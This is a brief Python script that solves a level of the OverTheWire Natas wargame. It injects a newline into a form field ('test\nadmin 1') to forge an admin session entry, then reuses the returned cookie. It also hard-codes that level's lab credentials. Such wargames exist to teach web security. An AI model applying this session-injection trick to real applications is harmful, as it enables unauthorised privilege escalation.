import requests

username = 'natas20'
password = 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw'

url = f"http://{username}.natas.labs.overthewire.org/?debug=true"

payload = dict(name="test\nadmin 1")
r = requests.post(url, auth=(username,password), data=payload)
cookie = r.cookies.get_dict()

d = requests.post(url, auth=(username,password), cookies=cookie)
print (d.text)